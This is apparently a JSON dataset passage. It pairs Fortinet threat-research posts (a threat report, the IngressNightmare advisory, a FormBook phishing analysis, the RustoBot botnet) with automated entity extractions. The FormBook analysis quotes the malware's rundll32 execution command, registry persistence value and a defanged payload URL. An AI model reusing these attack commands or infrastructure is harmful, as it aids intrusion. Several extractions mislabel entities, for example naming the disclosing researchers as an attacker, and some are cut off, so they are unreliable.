      "raw_output": "Named Entities: (FortiGuard Labs Threat Research, Organization), (FGIR, Organization), (Middle East, Location), (Iranian state-sponsored threat group, Attacker), (CNI, Threat Type), (Havoc, Malware), (HanifNet, Malware), (HXLibrary, Malware), (NeoExpressRAT, Malware), (plink, Tool), (Ngrok, Tool), (glider proxy, Tool), (ReverseSocks5, Tool), (Foothold, Technique), (Initial Operations, Technique), (SSL VPN, Tool), (IOCs, Technique), (Attribution considerations, Technique)\nRelationships: (FortiGuard Labs Threat Research, investigates, Iranian state-sponsored threat group), (FortiGuard Labs Threat Research, investigates, CNI), (FortiGuard Labs Threat Research, investigates, Middle East), (FortiGuard Labs Threat Research, investigates, FGIR), (Iranian state-sponsored threat group, targets, CNI), (Iranian state-sponsored threat group, targets, Middle East), (Havoc, used by, Iranian state-sponsored threat group), (HanifNet, used by, Iranian state-sponsored threat group), (HXLibrary, used by, Iranian state-sponsored threat group), (NeoExpressRAT, used by, Iranian state-sponsored threat group), (plink, used by, Iranian state-sponsored threat group), (Ngrok, used by, Iranian state-sponsored threat group",
      "entities": [
        [
          "FortiGuard Labs Threat Research",
          "Organization"
        ],
        [
          "FGIR",
          "Organization"
        ],
        [
          "Middle East",
          "Location"
        ],
        [
          "Iranian state-sponsored threat group",
          "Attacker"
        ],
        [
          "CNI",
          "Threat Type"
        ],
        [
          "Havoc",
          "Malware"
        ],
        [
          "HanifNet",
          "Malware"
        ],
        [
          "HXLibrary",
          "Malware"
        ],
        [
          "NeoExpressRAT",
          "Malware"
        ],
        [
          "plink",
          "Tool"
        ],
        [
          "Ngrok",
          "Tool"
        ],
        [
          "glider proxy",
          "Tool"
        ],
        [
          "ReverseSocks5",
          "Tool"
        ],
        [
          "Foothold",
          "Technique"
        ],
        [
          "Initial Operations",
          "Technique"
        ],
        [
          "SSL VPN",
          "Tool"
        ],
        [
          "IOCs",
          "Technique"
        ],
        [
          "Attribution considerations",
          "Technique"
        ]
      ],
      "relationships": [
        [
          "FortiGuard Labs Threat Research",
          "investigates",
          "Iranian state-sponsored threat group"
        ],
        [
          "FortiGuard Labs Threat Research",
          "investigates",
          "CNI"
        ],
        [
          "FortiGuard Labs Threat Research",
          "investigates",
          "Middle East"
        ],
        [
          "FortiGuard Labs Threat Research",
          "investigates",
          "FGIR"
        ],
        [
          "Iranian state-sponsored threat group",
          "targets",
          "CNI"
        ],
        [
          "Iranian state-sponsored threat group",
          "targets",
          "Middle East"
        ],
        [
          "Havoc",
          "used by",
          "Iranian state-sponsored threat group"
        ],
        [
          "HanifNet",
          "used by",
          "Iranian state-sponsored threat group"
        ],
        [
          "HXLibrary",
          "used by",
          "Iranian state-sponsored threat group"
        ],
        [
          "NeoExpressRAT",
          "used by",
          "Iranian state-sponsored threat group"
        ],
        [
          "plink",
          "used by",
          "Iranian state-sponsored threat group"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 18,
    "relationship_count": 11,
    "model": "Qwen3 4B",
    "index": 18
  },
  {
    "title": "Key Takeaways from the 2025 Global Threat Landscape Report",
    "link": "https://www.fortinet.com/blog/threat-research/key-takeaways-from-the-2025-global-threat-landscape-report",
    "content": "FortiGuard Labs Threat Research In 2024, the FortiGuard Labs team observed a decisive shift in the threat landscape: Attackers are compressing the time between reconnaissance and compromise, and the window for defenders to respond is narrowing to days, sometimes hours. The2025 Global Threat Landscape Reportdraws on telemetry from Fortinet’s global sensor network and threat intelligence from FortiGuard Labs to deliver a clear message: the adversary advantage is accelerating. And unless organizations change how they measure and manage risk, the gap will continue to widen. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. Across every stage of the attack chain, automation is reshaping threat behavior. In the reconnaissance phase, cybercriminals launched over 36,000 scans per second in 2024, a 16.7% global increase. These scans are no longer just searching for exposed ports; they’re probing deep into operational technology (OT), cloud APIs, and identity layers. SIP-based VoIP systems, RDP servers, and industrial protocols like Modbus TCP are being mapped automatically and continuously. Automation also extends to phishing, credential theft, and even malware development. Cyber adversaries use AI-powered tools like FraudGPT and ElevenLabs to craft convincing phishing lures, generate deepfake videos, and clone executive voices. Cybercriminals no longer need to write code or breach a system directly; threat actors can purchase access, tools, and infrastructure through a rapidly growing Cybercrime-as-a-Service (CaaS) marketplace. The result is an industrialized cybercrime economy that dramatically lowers the barrier to entry, expands the volume of attacks, and increases their success rate. In 2024, FortiGuard Labs tracked a 42% surge in stolen credentials offered on darknet forums. That’s more than 100 billion unique records—email addresses, passwords, session tokens, and multifactor bypass data—freely traded and sold. Infostealer malware like Redline and Vidar contributed to a 500% increase in credential log activity, much of it harvested in real time and sold by Initial Access Brokers (IABs) offering turnkey infiltration into corporate VPNs, RDPs, and admin panels. These credentials are the backbone of ransomware and espionage operations. Threat actors no longer just hunt for vulnerabilities to exploit; they’re buying entry into your network. And as long as stolen credentials remain abundant, brute force is unnecessary. Cloud services now sit at the center of modern operations, and identity has become one of the most critical security perimeters. Cloud breaches are no longer limited to misconfigured storage buckets. As infrastructure migrates to the cloud, attackers are finding familiar footholds to exploit, such as over-permissioned identities, credential leaks in public code repositories, and lateral movement through cloud-native services. FortiCNAPP telemetry shows that attackers often begin by logging in from unfamiliar geographies, sometimes within hours of a developer’s legitimate activity. From there, they escalate privileges, establish persistence, and use legitimate services to blend into normal network traffic. In 2024, 25% of all cloud incidents began with reconnaissance, such as API enumeration, permission probing, and discovery of exposed assets. Automation is also fueling scale. Fortinet’s intrusion prevention sensors recorded over 97 billion exploitation attempts in the second half of 2024, many targeting vulnerabilities disclosed years ago. CVE-2017-0147 (26.7% of all exploitation attempts), CVE-2021-44228 (11.6%), and CVE-2019-18935 (8%) remain among the most exploited—clear evidence that legacy exposures continue to create present-day risk. IoT devices were also a major target, accounting for over 20% of all exploits. Routers, surveillance cameras, and firewalls with outdated firmware or default credentials are being recruited into botnets, used for lateral movement, or exploited for persistent access. But what’s striking isn’t just the volume of exploitation. It’s how methodical it has become. Attackers aren’t wasting time. They map the exposed surfaces of potential victims, wait for a vulnerability to emerge, and either strike before the organization can apply a patch or sell that vulnerability information on darknet forums. Once inside, adversaries move with precision. In 88% of observed cases involving lateral movement, attackers used RDP to pivot within the network. Remote Access Trojans (RATs) such as Xeno RAT and SparkRAT provided remote command execution, data exfiltration, and long-term persistence. Living-off-the-land techniques using legitimate Windows tools and protocols have made traditional detection approaches less effective. Attackers routinely leveraged PowerShell, WMI, and SMB traffic anomalies to move laterally and escalate privileges. Active Directory manipulation (via DCSync and DCShadow) enabled attackers to harvest credentials and silently expand their access. Encrypted C2 channels, domain generation algorithms, and DNS tunneling were widely used to maintain communication with compromised systems, all while bypassing conventional perimeter defenses. The pattern is clear: Attackers are optimizing for speed, scale, and stealth. Defenders must do the same. Traditional security models that rely on static controls, point-in-time assessments, or delayed patch cycles are increasingly inadequate. What’s needed is a shift toward Continuous Threat Exposure Management (CTEM): This isn’t a technology conversation; it’s a business continuity conversation. Cyberthreats no longer wait for vulnerabilities to be exposed. Their reconnaissance efforts monitor all levels of the network, including compromised credentials and other weaknesses available on darknet forums, so they can strike before your team can respond. The global threat landscape is evolving, but the mission remains the same: reduce exposure, increase visibility, and move faster than the adversary. The Fortinet Security Fabric is designed to meet this challenge, uniting advanced threat intelligence, real-time detection, and coordinated response across the entire digital infrastructure. Executives must ensure their organizations are not only protected but positioned to adapt. Download the full2025 Global Threat Landscape Reportto gain deeper insights into these evolving threats and the strategies needed to counter them. FortiGuard Labs Threat Research Industry Trends Industry Trends Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "extraction": {
      "raw_output": "No related entities and relations\nOkay, let's tackle this. The user provided a text about the 2025 Global Threat Landscape Report by FortiGuard Labs. The task is to identify entities of specific types and their relationships as per the given guidelines.\n\nFirst, I'll scan through the text for any mentions of the entity types listed. The text talks about a report, threat landscape, attackers, reconnaissance, compromise, automation, phishing, AI tools like FraudGPT and ElevenLabs, and mentions of OT, cloud APIs, identity layers, SIP-based VoIP, RDP servers, Modbus TCP, etc.\n\nLooking at the entity types: Malware, Threat Type, Attacker, Technique, Tool, Vulnerability, IP, Domain, URL, File, Hash. \n\nThe text mentions \"cybercriminals\" which could be attackers, but the specific names aren't given. The report is a document, but it's not an entity type listed. The term \"AI-powered tools like FraudGPT and ElevenLabs\" are tools. \"Phishing\" is a technique. \"Automation\" is a broader term, but maybe not a specific entity. \"SIP-based VoIP systems\" might be tools or techniques. \"RDP servers\" are systems, but not sure if they fit. \"Modbus TCP\" is a protocol, maybe a tool or technique. \n\nWait, the example 4 mentions \"H2Miner botnet\" as",
      "entities": [],
      "relationships": [],
      "has_entities": false
    },
    "entity_count": 0,
    "relationship_count": 0,
    "model": "Qwen3 4B",
    "index": 19
  },
  {
    "title": "IngressNightmare: Understanding CVE‑2025‑1974 in Kubernetes Ingress-NGINX",
    "link": "https://www.fortinet.com/blog/threat-research/ingressnightmare-understanding-cve-2025-1974-in-kubernetes-ingress-nginx",
    "content": "FortiGuard Labs Threat Research Affected Platforms:Ingress-NGINX Containers v1.11.0-4, v1.12.0, <v1.11.0Impacted Users:Any OrganizationImpact:Attackers gain control of the vulnerable systemsSeverity Level:Critical On March 24, 2025, researchers from Wiz, Inc. disclosed a critical group of vulnerabilities in the Kubernetes Ingress-NGINX controller, dubbedIngressNightmare. Among the most severe issues isCVE‑2025‑1974, which allows an attacker with only network access to the admission webhook to potentially achieve remote code execution (RCE) in the ingress controller pod. This vulnerability was privately disclosed earlier in March and publicly announced after patches became available. It has a CVSS rating of 9.8, underscoring the severity and urgency of applying the fixes. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. This article summarizes how these CVEs work, explains our proof-of-concept demo of the exploit, and outlines mitigations and detection strategies. We’ll also show how Lacework FortiCNAPP and the broader Fortinet Security Fabric provide coverage for these kinds of attacks. Key Point: In many configurations, the admission webhook is reachable from within the cluster’s network (i.e., from any pod). That means a compromised pod or a foothold within the cluster can exploit these annotation injection flawswithoutneeding Kubernetes API credentials. Our testing confirmed that this exploit path requires an attacker to reach the Ingress-NGINX admission controller on the cluster network. If you can only access the cluster via kubectl port-forward or other indirect means, some temporary file uploading steps may not work reliably. Hence, in practice, this RCE exploit is often executed from a pod that already has an internal vantage point on the cluster network (for example, a malicious container running due to SSRF, a misconfigured job, or a prior partial compromise). When chained, these vulnerabilities let an attacker: We’ve created a short video demonstration that showcases how the exploit works from start to finish, which you can watch here: Network Note: Our tests confirm that port forwarding doesn’t always replicate the network conditions needed to trigger the file upload mechanism. We recommend running the exploit from a pod already in the cluster’s network if you’re assessing your own environment. Because this vulnerability chain can yield near-complete cluster compromise, remediation should be a top priority. Key recommendations include: For a more detailed look at the patch details, see: Within our test environment, we leveragedLacework FortiCNAPPcomponents to gain multi-layered visibility into the compromise: In our demo, alerts were generated when we: Beyond Lacework FortiCNAPP’s container-aware protections, the broaderFortinet Security Fabricprovides additional layers of defense: For a summary of how Fortinet addresses this specific vulnerability and the associated set of CVEs, see theFortiGuard Threat Signal Reportpublished on April 3rd, 2025. IngressNightmare(CVE‑2025‑1974 and related flaws) highlights the importance of secure ingress configurations and strict controls on admission webhooks. By exploiting an internal vantage point, attackers can pivot from a low-privileged pod into a full cluster compromise if the ingress controller is left unpatched and overly exposed. Fortunately, patching and hardening are straightforward: Continuous visibility and detection go hand in hand with strong prevention. Tools likeLacework FortiCNAPPand theFortinet Security Fabricadd significant layers of protection for both container runtime security and the cloud control plane. Organizations can keep their Kubernetes clusters resilient against emerging threats like IngressNightmare by staying current on vulnerability disclosures and employing a defense-in-depth approach. Thank you for reading—and be sure to watch thedemo videofor an in-depth look at this exploit in action. Stay vigilant, and keep your clusters secure! FortiGuard Labs provides an IPS signature against attacks exploiting the following vulnerability: CVE-2025-1974: Kubernetes.Ingress.NGINX.Controller.Remote.Code.Execution If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. Partners Business and Technology Industry Trends Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "extraction": {
      "raw_output": "Named Entities: (Ingress-NGINX Containers v1.11.0-4, File), (Ingress-NGINX Containers v1.12.0, File), (<v1.11.0, File), (CVE-2025-1974, Vulnerability), (Wiz, Inc., Attacker), (IngressNightmare, Threat Type), (Lacework FortiCNAPP, Tool), (FortiCNAPP, Tool), (Fortinet Security Fabric, Tool), (Kubernetes Ingress-NGINX controller, Tool)\nRelationships: (Ingress-NGINX Containers v1.11.0-4, associated with, CVE-2025-1974), (Ingress-NGINX Containers v1.12.0, associated with, CVE-2025-1974), (<v1.11.0, associated with, CVE-2025-1974), (Wiz, Inc., disclosed, CVE-2025-1974), (IngressNightmare, exploit, CVE-2025-1974), (IngressNightmare, associated with, Kubernetes Ingress-NGINX controller), (Lacework FortiCNAPP, provide coverage for, IngressNightmare), (FortiCNAPP,",
      "entities": [
        [
          "Ingress-NGINX Containers v1.11.0-4",
          "File"
        ],
        [
          "Ingress-NGINX Containers v1.12.0",
          "File"
        ],
        [
          "<v1.11.0",
          "File"
        ],
        [
          "CVE-2025-1974",
          "Vulnerability"
        ],
        [
          "Wiz",
          "Inc.",
          "Attacker"
        ],
        [
          "IngressNightmare",
          "Threat Type"
        ],
        [
          "Lacework FortiCNAPP",
          "Tool"
        ],
        [
          "FortiCNAPP",
          "Tool"
        ],
        [
          "Fortinet Security Fabric",
          "Tool"
        ],
        [
          "Kubernetes Ingress-NGINX controller",
          "Tool"
        ]
      ],
      "relationships": [
        [
          "Ingress-NGINX Containers v1.11.0-4",
          "associated with",
          "CVE-2025-1974"
        ],
        [
          "Ingress-NGINX Containers v1.12.0",
          "associated with",
          "CVE-2025-1974"
        ],
        [
          "<v1.11.0",
          "associated with",
          "CVE-2025-1974"
        ],
        [
          "Wiz",
          "Inc.",
          "disclosed",
          "CVE-2025-1974"
        ],
        [
          "IngressNightmare",
          "exploit",
          "CVE-2025-1974"
        ],
        [
          "IngressNightmare",
          "associated with",
          "Kubernetes Ingress-NGINX controller"
        ],
        [
          "Lacework FortiCNAPP",
          "provide coverage for",
          "IngressNightmare"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 10,
    "relationship_count": 7,
    "model": "Qwen3 4B",
    "index": 20
  },
  {
    "title": "Infostealer Malware FormBook Spread via Phishing Campaign – Part I",
    "link": "https://www.fortinet.com/blog/threat-research/infostealer-malware-formbook-spread-via-phishing-campaign-part-i",
    "content": "FortiGuard Labs Threat Research Fortinet’s FortiGuard Labs observed a phishing campaign in the wild that delivered a malicious Word document as an attachment. This document contained crafted data designed to exploit the vulnerabilityCVE-2017-11882. After conducting an in-depth analysis, I discovered that the campaign was spreading a new variant of Formbook. Formbook is information-stealing malware targeting Windows users. It steals sensitive data from compromised systems, including stored credentials from popular software, the victim’s keystrokes, screenshots, and system clipboard data. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. I will present my research into this malware in a series of analysis blogs. This first one provides insights into how the phishing email tricks the recipient into opening the attached Word document, how it exploits the vulnerability CVE-2017-11882 with crafted equation data, how it downloads and decrypts the fileless FormBook executable, and how it ultimately executes the FormBook malware in a selected target process via process hollowing. The phishing campaign starts with an email disguised as a sales order urging the recipient to open the attached Word document. As shown in Figure 1, FortiMail has flagged the email as “[virus detected]” in the Subject line to warn the recipient. The attached Word document, order0087.docx, is saved in OOXML (Office Open XML) format and compressed as a ZIP archive. Figure 2 reveals the relevant files and file contents inside the Word document. When the recipient opens the Word document, the “<w:altChunk>” node within document.xml is parsed, automatically loading an external file, “Algeria.rtf,” as shown in Figure 2. The RTF file (“Algeria.rtf”) is obfuscated with a large amount of junk data. After de-obfuscating the RTF file, two embedded binary objects (leading by “\\objdata” tag) can be found within it. The first binary object is a package containing a 64-bit DLL file, as shown in Figure 3. The DLL file, named “AdobeID.pdf,” is extracted to the system %temp% folder when the RTF is opened in Microsoft Word. The second binary object is in OLE format and contains crafted equation data intended for Microsoft Equation Editor 3.0. When Word parses the RTF file, this exploits the CVE-2017-11882 vulnerability. CVE-2017-11882is a known remote code execution (RCE) vulnerability in Microsoft Equation Editor (EQNEDT32.EXE). Parsing the crafted equation data in EQNEDT32.EXE causes a buffer overflow, and the return address of the vulnerable function is overwritten with 0x430C12, as seen in Figure 4. The instruction at 0x430C12 is “call  ds:WinExec(),” which is called after the buffer overflow occurs and the vulnerable function returns to this address. Figure 5 shows a screenshot of EQNEDT32.exe calling this API at 0x430C12. The command-line parameter to WinExec() API is “CmD.exe /C rundll32 %tmp%\\AdobeID.pdf,IEX  A”. This command is copied by the vulnerable function from the crafted equation data, as shown in Figure 4. As a result, the extracted 64-bit DLL file, AdobeID.pdf, is executed by rundll32.exe. Based on my analysis, the 64-bit DLL acts as a downloader and installer for Formbook. Let’s examine how it works. It adds a key into “HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run,” with the following settings: Key name: “RtkAudUService”Key value: “C:\\Windows\\System32\\rundll32.exe C:\\Users\\win-10\\AppData\\Roaming\\Templates\\AdobeID.pdf, IEX” This ensures the malicious command-line command executes automatically at the system’s startup. Figure 6 shows the added auto-run item in the system registry. Correspondingly, it: 1> Creates a folder named “Templates” under the %appdata% folder. 2> Copies the extracted 64-bit DLL into the new folder by executing the following command-line command: “cmd.exe /c copy C:\\Users\\%username%\\AppData\\Local\\Temp\\AdobeID.pdf   C:\\Users\\%username%\\AppData\\Roaming\\Templates” The Formbook payload is disguised as a picture file (PNG) to be downloaded. The URL to the PNG file is: “hxxps://www2[.]0zz0[.]com/2025/02/02/10/709869215.png” To retrieve the payload, it uses multiple Windows API functions, including: WinHttpCrackUrl(),WinHttpOpen(),WinHttpConnect(),WinHttpOpenRequest(),WinHttpSendRequest(),WinHttpQueryOption(),WinHttpReceiveResponse(),WinHttpQueryDataAvailable()WinHttpReadData() I manually downloaded the PNG file to analyze it. Its size is 0x47000 (284KB). I then observed that its content is encrypted rather than a legitimate PNG (Figure 7). The malware then calls a function to decrypt the PNG file into the FormBook executable binary, as seen in Figure 8. The decrypted FormBook can be seen in the memory at the bottom. The decryption key is generated from a hardcoded string, “H1OX2WsqMLPKvGkQ.” To evade detection by endpoint security software, the FormBook payload executable is kept entirely in the memory. Since it does not write the decrypted Formbook to a local file to execute, this is a fileless variant of FormBook. This variant of FormBook chooses “C:\\Program Files (x86)\\Windows Photo Viewer\\ImagingDevices.exe” as a target process to run the decrypted FormBook via process hollowing. The full path of the target process is hardcoded in the variant, which is passed to CreateProcessInternalW() API. In Figure 9 below, we see that the process is about to call the CreateProcessInternalW() API, whose second parameter (RDX holds) is a string of the full path of the target process. The sixth parameter ([rsp+30]) represents the CreationFlag. The value for the CreationFlag is 0x808040C, which is a combination of the following flags: CREATE_SUSPENDEDDETACHED_PROCESSCREATE_UNICODE_ENVIRONMENTCREATE_NO_WINDOW This ultimately creates a suspended “ImagingDevices.exe” process. The malware employs sophisticated process injection techniques: It creates a temporary and invisible file by calling two APIs: GetTempFileNameW()NtCreateFile() It then calls NtWriteFile() to write the decrypted FormBook executable into the invisible temporary file. Next, it calls NtCreateSection() API to create a memory section object from the temporary file, whose file handle is passed to the API. It then maps the section object into the target process (ImagingDevices.exe) by calling the Windows native API NtMapViewOfSection(). It also returns the address of the mapped FormBook inside the target process. At that point, the decrypted FormBook has been copied into the target process. Next, it calls the Wow64GetThreadContext() API to retrieve the thread context (the CPU register value/state) of the suspended target process. It then modifies the value of some registers so the target process points to the mapped FormBook. The corresponding API, Wow64SetThreadContext(), is then called to apply the modified registers to the target process. Figure 11 shows the WOW64_CONTEXT data in memory. It only modifies two register values, EAX to 0x6E1550 and EBX to 0x2D0D0. Why does it only modify those two registers rather than EIP? The selective modification of only EAX and EBX becomes clear when examining the target process's suspended state. The process has been intercepted at the execution of RtlUserThreadStart(), where EAX holds the thread function address and EBX contains the parameter to be passed to this thread function. Now, the value of EAX holds the entry point of FormBook inside the target process, where FormBook’s base address is 0x6E0000. It finally calls the Windows native API, NtResumeThread(), to resume the target process, and the RtlUserThreadStart() API is invoked to run the FormBook payload in a newly created thread. In this first part of the blog series on the FormBook malware, I presented the entire process, from the phishing email to how the FormBook payload is downloaded, decrypted, and deployed in a targeted process. To start, I presented the phishing email we discovered that was designed to trick recipients into opening a fake sales order attachment. Once the attached Word document is opened on the targeted device, it extracts a 64-bit DLL file, disguised as \"AdobeID.pdf,” into the system’s temporary folder. At the same time, it exploits the CVE-2017-11882 vulnerability in Microsoft Equation Editor 3.0 to execute the extracted DLL. The DLL file is launched via rundll32.exe, establishing persistence on the victim’s system by adding an auto-run item to the system registry. Additionally, it downloads and decrypts the FormBook executable file. I then provided a detailed explanation of how the decrypted FormBook payload is deployed in a target process (C:\\Program Files (x86)\\Windows Photo Viewer\\ImagingDevices.exe) through process hollowing, as well as the Windows-native APIs it calls to accomplish this task. InPart IIof this series, I will present the anti-analysis techniques used in this variant of FormBook and how FormBook leverages the Heaven’s Gate technique to prevent analysis and detection. I’ll also cover how it collects sensitive data from the compromised device, its communications with its command and control (C2) server, and the specific C&C commands it uses to control the victim’s system. Stay tuned. Fortinet customers are already protected from this campaign with FortiGuard’s AntiSPAM, Web Filtering, IPS, and AntiVirus services as follows: The FortiGuard’s Anti-Botnet Service has blocked the DNS requests for downloading the FormBook variant. The relevant URL downloading the PNG file is rated as “Malicious Websites” by the FortiGuard Web Filtering service. FortiMail recognizes the phishing email as “virus detected.” In addition, real-time anti-phishing provided by FortiSandbox embedded in Fortinet’s FortiMail, web filtering, and antivirus solutions provides advanced protection against both known and unknown phishing attempts. FortiGuard IPS service detects the vulnerability exploit against CVE-2017-11882 with the signature “MS.Office.EQNEDT32.EXE.Equation.Parsing.Memory.Corruption”. FortiGuard Antivirus service detects the malicious Word document, the embedded RTF file, the extracted 64-bit Dll file as well as the decrypted FormBook with the following AV signatures. MSWord/Formbook.9184!trRTF/CVE_2017_11882.FB!exploitW64/Formbook.RT!trW32/Formbook.AA!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each solution. As a result, customers who have these products with up-to-date protections are already protected. To stay informed of new and emerging threats, you cansign upto receive future alerts. We also suggest our readers go through the freeNSE training:NSE 1 – Information Security Awareness, a module on Internet threats designed to help end users learn how to identify and protect themselves from phishing attacks. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. hxxps://www2[.]0zz0[.]com/2025/02/02/10/709869215.png [order0087.docx]93CF566C0997D5DCD1129384420E4CE59764BD86FDABAAA8B74CAF5318BA9184 [Algeria.rtf]7C66E3156BBE88EC56294CD2CA15416DD2B18432DEEDC024116EA8FBB226D23B [AdobeID.pdf]2E73B32D2180FD06F5142F68E741DA1CFF1C5E96387CEBD489AD78DE18840A56 [Decrypted FormBook from PNG file]6AC778712DFFCE48B51850AC34A846DA357BE07328B00D0B629EC9B2F1C37ECE infostealer FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "extraction": {
      "raw_output": "Named Entities: (FortiGuard Labs, Organization), (Fortinet, Organization), (phishing campaign, Threat Type), (malicious Word document, File), (CVE-2017-11882, Vulnerability), (Formbook, Malware), (Windows, OS), (2025 Global Threat Landscape Report, Document), (FortiMail, Tool)\nRelationships: (FortiGuard Labs, observed, phishing campaign), (phishing campaign, delivers, malicious Word document), (malicious Word document, exploits, CVE-2017-11882), (phishing campaign, spreads, Formbook), (Formbook, targets, Windows), (phishing campaign, associated with, 2025 Global Threat Landscape Report), (phishing campaign, uses, FortiMail)\nAnswer: \n\nNamed Entities: (FortiGuard Labs, Organization), (Fortinet, Organization), (phishing campaign, Threat Type), (malicious Word document, File), (CVE-2017-11882, Vulnerability), (Formbook, Malware), (Windows, OS), (2025 Global Threat Landscape Report, Document), (FortiMail, Tool)\nRelationships: (FortiGuard Labs, observed, phishing campaign), (phishing campaign, delivers, malicious Word document), (malicious Word document, exploits, CVE-2017-1",
      "entities": [
        [
          "FortiGuard Labs",
          "Organization"
        ],
        [
          "Fortinet",
          "Organization"
        ],
        [
          "phishing campaign",
          "Threat Type"
        ],
        [
          "malicious Word document",
          "File"
        ],
        [
          "CVE-2017-11882",
          "Vulnerability"
        ],
        [
          "Formbook",
          "Malware"
        ],
        [
          "Windows",
          "OS"
        ],
        [
          "2025 Global Threat Landscape Report",
          "Document"
        ],
        [
          "FortiMail",
          "Tool"
        ],
        [
          "FortiGuard Labs",
          "Organization"
        ],
        [
          "Fortinet",
          "Organization"
        ],
        [
          "phishing campaign",
          "Threat Type"
        ],
        [
          "malicious Word document",
          "File"
        ],
        [
          "CVE-2017-11882",
          "Vulnerability"
        ],
        [
          "Formbook",
          "Malware"
        ],
        [
          "Windows",
          "OS"
        ],
        [
          "2025 Global Threat Landscape Report",
          "Document"
        ],
        [
          "FortiMail",
          "Tool"
        ]
      ],
      "relationships": [
        [
          "FortiGuard Labs",
          "observed",
          "phishing campaign"
        ],
        [
          "phishing campaign",
          "delivers",
          "malicious Word document"
        ],
        [
          "malicious Word document",
          "exploits",
          "CVE-2017-11882"
        ],
        [
          "phishing campaign",
          "spreads",
          "Formbook"
        ],
        [
          "Formbook",
          "targets",
          "Windows"
        ],
        [
          "phishing campaign",
          "associated with",
          "2025 Global Threat Landscape Report"
        ],
        [
          "phishing campaign",
          "uses",
          "FortiMail"
        ],
        [
          "FortiGuard Labs",
          "observed",
          "phishing campaign"
        ],
        [
          "phishing campaign",
          "delivers",
          "malicious Word document"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 18,
    "relationship_count": 9,
    "model": "Qwen3 4B",
    "index": 21
  },
  {
    "title": "New Rust Botnet \"RustoBot\" is Routed via Routers",
    "link": "https://www.fortinet.com/blog/threat-research/new-rust-botnet-rustobot-is-routed-via-routers",
    "content": "FortiGuard Labs Threat Research Affected Platforms:TOTOLINK N600R V4.3.0cu.7570_B20200620. TOTOLINK A830R V5.9c.4729_B20191112, A3100R V4.1.2cu.5050_B20200504, A950RG V4.1.2cu.5161_B20200903, A800R V4.1.2cu.5137_B20200730, A3000RU V5.9c.5185_B20201128, and A810R V4.1.2cu.5182_B20201026. DrayTek Vigor2960 and Vigor300B 1.5.1.4.Impacted Users:Any organizationImpact:Remote attackers gain control of the vulnerable systemsSeverity Level:High FortiGuard Labs recently discovered a new botnet propagating through TOTOLINK devices. Unlike previous malware targeting these devices, this variant is written inRust—a programming language introduced by Mozilla in 2010. Due to its Rust-based implementation, we’ve named the malware“RustoBot.” 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. In January and February of 2025, FortiGuard Labs observed a significant increase in alerts related to attacking via TOTOLINK vulnerabilities. TOTOLINK vulnerabilities often stem from thecstecgi.cgifile—a CGI script responsible for processing user inputs, configuration changes, authentication, and administrative commands. These scripts have repeatedly been found to contain flaws, most notably command injection vulnerabilities that can be exploited remotely. Attackers can leverage various functions within this script to achieve remote code execution, includingsetUpgradeFW(CVE-2022-26210) andpingCheck(CVE-2022-26187). When we analyzed the payload athxxp://66[.]63[.]187[.]69/mpsl, we identified another vulnerability—CVE-2024-12987—affecting DrayTek devices, which was exploited by attackers during the same period. This vulnerability is an OS command injection located in thecgi-bin/mainfunction.cgi/apmcfguploadinterface. These exploits occurred in four countries: Japan, Taiwan, Vietnam, and Mexico. All incidents were aimed at technology industries. In this section, our analysis of “RustoBot” focuses on the x86 architecture version. Attackers distribute this malware using four different downloader scripts and employ two distinct commands—wgetandtftp—to retrieve and install “RustoBot.” According to the downloader scripts, “RustoBot” targets five different architectures:arm5,arm6,arm7,mips, andmpsl. However, we also identified an additional x86 architecture variant hosted on the same server. Most of the observed incident payloads specifically target TOTOLINK devices using thempslarchitecture, as illustrated in Figure 2. The malware can be identified from its plaintext string written in Rust. Its entry point can be found after analyzing the second layer of the “start” function. “RustoBot” retrieves the offsets of system API functions from the Global Offset Table (GOT) and invokes them to carry out specific behaviors. It encodes its configuration via the XOR encryption algorithm and uses numerous calculations to achieve obfuscation. First, “RustoBot” sets constants into registers for the following steps. It then makes use of instructions like “xor,” “shr,” and, “rol” to get the decoder key’s offset. Lastly, XOR decodes the hard-coded cipher with the key obtained from the former offset. Once the configuration value is decoded, it is used as an argument for subsequent functions defined in the decoded configuration. “RustoBot” exhibits two primary malicious behaviors: the first is resolving the C2 server’s domain, and the second is launching a DDoS attack. It first sends an initial packet to retrieve IP address data—specifically, the victim host’s public IP address—which is returned by the attacker’s server. It uses DNS-over-HTTPS (DoH) to blend malicious traffic into normal HTTPS requests, helping it hide within large volumes of legitimate web traffic. The retrieved IP address is then used as the value of the header field “S,” which we surmise stands for “Source.” “RustoBot” attempts to resolve four domains:dvrhelper[.]anondns[.]net,techsupport[.]anondns[.]net,rustbot[.]anondns[.]net, andmiraisucks[.]anondns[.]net. All of these domains resolve to the same IP address:5[.]255[.]125[.]150. The botnet subsequently establishes a connection with5[.]255[.]125[.]150and receives a set of parameters that serve as commands to trigger a DDoS attack: It can launch DDoS attacks using three different protocols:Raw IP,TCP, andUDP. IoT and network devices are often poorly defended endpoints, making them attractive targets for attackers to exploit and deliver malicious programs. Strengthening endpoint monitoring and authentication can significantly reduce the risk of exploitation and help mitigate malware campaigns. The malware described in this report is detected and blocked byFortiGuard Antivirusas: BASH/Mirai.AEH!tr.dldrELF/Mirai.CZX!trELF/Mirai.DCD!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each of these solutions. As a result, customers who have these products with up-to-date protections are protected. TheFortiGuard Web Filtering Serviceblocks the C2 server. FortiGuard Labs provides 